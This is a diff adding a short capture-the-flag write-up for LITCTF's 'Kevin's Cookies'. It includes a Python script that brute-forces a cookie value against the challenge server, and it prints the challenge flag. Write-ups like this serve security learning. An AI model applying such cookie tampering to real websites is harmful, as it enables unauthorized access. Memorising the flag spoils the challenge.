@@ -1,0 +1,25 @@
+<h2>Kevin’s Cookies</h2>
+
+<p>In cookies, there is a key called likeCookie whose value is false. If we change the value to true, we will see the following message.</p>
+
+<blockquote>
+  <p>Oh silly you. What do you mean you like a true cookie?
+  I have 20 cookies numbered from 1 to 20, and all of them are made from super true authentic recipes.</p>
+</blockquote>
+
+<p>script
+```python
+import requests</p>
+
+<p>url = "http://litctf.live:31778/"</p>
+
+<p>for i in range(20):
+    r = requests.get(url, cookies={"likeCookie":str(i)})
+    if "LITCTF{" in r.text:
+        print("likeCookie : ", i)
+        break
+```</p>
+
+<p><code>
+LITCTF{Bd1mens10n_15_l1k3_sup3r_dup3r_0rzzzz}
+</code></p>
